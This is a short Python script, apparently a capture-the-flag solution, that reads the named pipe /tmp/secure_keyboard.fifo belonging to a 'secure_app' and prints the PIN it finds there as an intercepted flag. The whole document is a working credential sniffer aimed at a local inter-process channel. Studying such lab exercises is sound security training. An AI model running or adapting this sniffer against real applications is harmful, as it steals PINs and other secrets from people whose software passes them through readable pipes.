#!/usr/bin/env python3
import os
import sys

FIFO_PATH = "/tmp/secure_keyboard.fifo"

def main():
    print("[*] Sniffing named pipe at /tmp/secure_keyboard.fifo...")
    if not os.path.exists(FIFO_PATH):
        print("[-] Named pipe does not exist yet. Make sure secure_app is running!")
        sys.exit(1)
        
    try:
        # Open and read the stream from the named pipe
        with open(FIFO_PATH, "r") as fifo:
            for line in fifo:
                line = line.strip()
                if "PIN:" in line:
                    flag = line.split(":", 1)[1]
                    print(f"\n🎉 SUCCESS! Intercepted Flag: {flag}\n")
                    sys.exit(0)
    except KeyboardInterrupt:
        print("\n[-] Sniffing cancelled.")
    except Exception as e:
        print(f"[-] Error reading pipe: {e}")

if __name__ == "__main__":
    main()
